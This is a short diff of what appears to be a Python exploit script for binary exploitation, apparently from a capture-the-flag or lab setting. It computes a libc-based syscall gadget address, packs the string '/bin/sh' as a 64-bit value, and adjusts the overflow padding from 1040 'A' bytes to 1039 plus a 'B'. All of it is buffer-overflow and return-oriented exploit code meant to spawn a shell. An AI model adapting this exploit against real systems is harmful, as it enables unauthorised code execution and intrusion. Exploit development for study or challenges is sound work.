@@ -18,7 +18,8 @@ g4 = LIBC_OFFSET + 0x15a76a # syscall  (0x15a76b)
 
 shellcode = struct.pack('<q', 0x0068732f6e69622f) #?
 
-shellcode += 'A'*(1040)
+shellcode += 'A'*(1039)
+shellcode += 'B'
 #shellcode += 'B'
 
 
